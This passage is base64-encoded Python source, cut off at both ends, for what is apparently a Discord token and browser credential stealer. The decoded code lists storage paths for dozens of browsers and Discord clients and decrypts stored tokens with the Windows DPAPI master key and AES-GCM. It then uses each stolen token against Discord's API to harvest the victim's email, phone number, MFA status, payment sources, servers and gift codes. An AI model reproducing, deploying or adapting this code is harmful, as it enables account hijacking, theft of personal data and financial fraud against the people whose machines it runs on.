AgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkJyYXZlU29mdHdhcmUiLCAiQnJhdmUtQnJvd3NlciIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiQW1pZ28iOiB7DQogICAgICAgICAgICAiYmFzZV9wYXRoIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkFtaWdvIiwgIlVzZXIgRGF0YSIpLA0KICAgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkFtaWdvIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJUb3JjaCI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiVG9yY2giLCAiVXNlciBEYXRhIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiVG9yY2giLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0YXRlIikNCiAgICAgICAgfSwNCiAgICAgICAgIktvbWV0YSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiS29tZXRhIiwgIlVzZXIgRGF0YSIpLA0KICAgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIktvbWV0YSIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiT3JiaXR1bSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiT3JiaXR1bSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJPcmJpdHVtIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDZW50QnJvd3NlciI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiQ2VudEJyb3dzZXIiLCAiVXNlciBEYXRhIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiQ2VudEJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0YXRlIikNCiAgICAgICAgfSwNCiAgICAgICAgIjdTdGFyIjogew0KICAgICAgICAgICAgImJhc2VfcGF0aCI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICI3U3RhciIsICI3U3RhciIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICI3U3RhciIsICI3U3RhciIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiU3B1dG5payI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiU3B1dG5payIsICJTcHV0bmlrIiwgIlVzZXIgRGF0YSIpLA0KICAgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIlNwdXRuaWsiLCAiU3B1dG5payIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiVml2YWxkaSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiVml2YWxkaSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJWaXZhbGRpIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJFcGljIjogew0KICAgICAgICAgICAgImJhc2VfcGF0aCI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJFcGljIFByaXZhY3kgQnJvd3NlciIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJFcGljIFByaXZhY3kgQnJvd3NlciIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiVXJhbiI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAidUNvek1lZGlhIiwgIlVyYW4iLCAiVXNlciBEYXRhIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAidUNvek1lZGlhIiwgIlVyYW4iLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0YXRlIikNCiAgICAgICAgfSwNCiAgICAgICAgIllhbmRleCI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiWWFuZGV4IiwgIllhbmRleEJyb3dzZXIiLCAiVXNlciBEYXRhIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiWWFuZGV4IiwgIllhbmRleEJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0YXRlIikNCiAgICAgICAgfSwNCiAgICAgICAgIklyaWRpdW0iOiB7DQogICAgICAgICAgICAiYmFzZV9wYXRoIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIklyaWRpdW0iLCAiVXNlciBEYXRhIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiSXJpZGl1bSIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICB3aXRoIG9wZW4ob3V0cHV0X2ZpbGUsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZm9yIGJyb3dzZXJfbmFtZSwgcGF0aHMgaW4gYnJvd3NlcnMuaXRlbXMoKToNCiAgICAgICAgICAgIHN0ZWFsX2Zyb21fYnJvd3Nlcihicm93c2VyX25hbWUsIHBhdGhzWyJiYXNlX3BhdGgiXSwgcGF0aHNbImxvY2FsX3N0YXRlIl0sIGYpDQogICAgICAgICAgICANCmNsYXNzIGV4dHJhY3RfdG9rZW5zOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOg0KICAgICAgICBzZWxmLmJhc2VfdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSINCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJlZ2V4cCA9IHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSINCiAgICAgICAgc2VsZi5yZWdleHBfZW5jID0gciJkUXc0dzlXZ1hjUTpbXlwiXSoiDQogICAgICAgIHNlbGYudG9rZW5zLCBzZWxmLnVpZHMgPSBbXSwgW10NCiAgICAgICAgc2VsZi5leHRyYWN0KCkNCg0KICAgIGRlZiBleHRyYWN0KHNlbGYpIC0+IE5vbmU6DQogICAgICAgIHBhdGhzID0gew0KICAgICAgICAgICAgJ0Rpc2NvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZGNhbmFyeVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdMaWdodGNvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxMaWdodGNvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnRGlzY29yZCBQVEInOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ09wZXJhJzogc2VsZi5yb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdPcGVyYSBHWCc6IHNlbGYucm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQW1pZ28nOiBzZWxmLmFwcGRhdGEgKyAnXFxBbWlnb1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1RvcmNoJzogc2VsZi5hcHBkYXRhICsgJ1xcVG9yY2hcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdLb21ldGEnOiBzZWxmLmFwcGRhdGEgKyAnXFxLb21ldGFcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdPcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0NlbnRCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICc3U3Rhcic6IHNlbGYuYXBwZGF0YSArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1NwdXRuaWsnOiBzZWxmLmFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnVml2YWxkaSc6IHNlbGYuYXBwZGF0YSArICdcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWUgU3hTJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2hyb21lJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWUxJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Nocm9tZTInOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2hyb21lMyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgM1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWU0Jzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Nocm9tZTUnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnRXBpYyBQcml2YWN5IEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ01pY3Jvc29mdCBFZGdlJzogc2VsZi5hcHBkYXRhICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnVXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcNCiAgICAgICAgfQ0KDQogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6DQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IGNvbnRpbnVlDQogICAgICAgICAgICBfZGlzY29yZCA9IG5hbWUucmVwbGFjZSgiICIsICIiKS5sb3dlcigpDQogICAgICAgICAgICBpZiAiY29yZCIgaW4gcGF0aDoNCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nK2YnXFx7X2Rpc2NvcmR9XFxMb2NhbCBTdGF0ZScpOiBjb250aW51ZQ0KICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9uYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOiBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHkgaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4cF9lbmMsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gc2VsZi5kZWNyeXB0X3ZhbChiYXNlNjQuYjY0ZGVjb2RlKHkuc3BsaXQoJ2RRdzR3OVdnWGNROicpWzFdKSwgc2VsZi5nZXRfbWFzdGVyX2tleShzZWxmLnJvYW1pbmcrZidcXHtfZGlzY29yZH1cXExvY2FsIFN0YXRlJykpDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudmFsaWRhdGVfdG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNlX3VybCwgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKVsnaWQnXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlbGYudWlkczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudWlkcy5hcHBlbmQodWlkKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6DQogICAgICAgICAgICAgICAgICAgIGlmIGZpbGVfbmFtZVstMzpdIG5vdCBpbiBbImxvZyIsICJsZGIiXTogY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHNlbGYucmVnZXhwLCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLnZhbGlkYXRlX3Rva2VuKHRva2VuKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZV91cmwsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKClbJ2lkJ10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLnVpZHM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnVpZHMuYXBwZW5kKHVpZCkNCg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcrIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToNCiAgICAgICAgICAgIGZvciBwYXRoLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOg0KICAgICAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9maWxlLmVuZHN3aXRoKCcuc3FsaXRlJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtfZmlsZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4cCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi52YWxpZGF0ZV90b2tlbih0b2tlbik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2VfdXJsLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpWydpZCddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi51aWRzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi51aWRzLmFwcGVuZCh1aWQpDQoNCiAgICBkZWYgdmFsaWRhdGVfdG9rZW4oc2VsZiwgdG9rZW46IHN0cikgLT4gYm9vbDoNCiAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2VfdXJsLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkNCiAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6IHJldHVybiBUcnVlDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIA0KICAgIGRlZiBkZWNyeXB0X3ZhbChzZWxmLCBidWZmOiBieXRlcywgbWFzdGVyX2tleTogYnl0ZXMpIC0+IHN0cjoNCiAgICAgICAgaXYgPSBidWZmWzM6MTVdDQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0NCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQ0KICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkNCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzDQoNCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgcGF0aDogc3RyKSAtPiBzdHI6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuDQogICAgICAgIGlmICdvc19jcnlwdCcgbm90IGluIG9wZW4ocGF0aCwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKS5yZWFkKCk6IHJldHVybg0KICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOiBjID0gZi5yZWFkKCkNCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpDQoNCiAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkNCiAgICAgICAgbWFzdGVyX2tleSA9IG1hc3Rlcl9rZXlbNTpdDQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0NCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkNCg0KY2xhc3MgZmV0Y2hfdG9rZW5zOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi50b2tlbnMgPSBleHRyYWN0X3Rva2VucygpLnRva2Vucw0KDQogICAgYXN5bmMgZGVmIHVwbG9hZChzZWxmLCBjdHgsIHJhd19kYXRhPUZhbHNlKToNCiAgICAgICAgaWYgbm90IHNlbGYudG9rZW5zOg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIA0KICAgICAgICBmaW5hbF90b19yZXR1cm4gPSBbXQ0KDQogICAgICAgIGFzeW5jIHdpdGggYWlvaHR0cC5DbGllbnRTZXNzaW9uKCkgYXMgc2Vzc2lvbjoNCiAgICAgICAgICAgIGZvciB0b2tlbiBpbiBzZWxmLnRva2VuczoNCiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24uZ2V0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUnLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkgYXMgcmVzcG9uc2U6DQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSBhd2FpdCByZXNwb25zZS5qc29uKCkNCg0KICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcycsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KSBhcyByZXNwb25zZToNCiAgICAgICAgICAgICAgICAgICAgYmlsbGluZyA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKQ0KDQogICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBzZXNzaW9uLmdldCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcz93aXRoX2NvdW50cz10cnVlJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pIGFzIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgICAgICBndWlsZHMgPSBhd2FpdCByZXNwb25zZS5qc29uKCkNCg0KICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9vdXRib3VuZC1wcm9tb3Rpb25zL2NvZGVzJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pIGFzIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgICAgICBnaWZ0X2NvZGVzID0gYXdhaXQgcmVzcG9uc2UuanNvbigpDQoNCiAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJbJ3VzZXJuYW1lJ10gKyAnIycgKyB1c2VyWydkaXNjcmltaW5hdG9yJ10NCiAgICAgICAgICAgICAgICB1c2VyX2lkID0gdXNlclsnaWQnXQ0KICAgICAgICAgICAgICAgIGVtYWlsID0gdXNlclsnZW1haWwnXQ0KICAgICAgICAgICAgICAgIHBob25lID0gdXNlclsncGhvbmUnXQ0KICAgICAgICAgICAgICAgIG1mYSA9IHVzZXJbJ21mYV9lbmFibGVkJ10NCiAgICAgICAgICAgICAgICBhdmF0YXJfdXJsID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3t1c2VyX2lkfS97dXNlclsnYXZhdGFyJ119LmdpZiINCiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24uZ2V0KGF2YXRhcl91cmwpIGFzIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXMgPT0gMjAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgYXZhdGFyID0gYXZhdGFyX3VybA0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgYXZhdGFyID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmN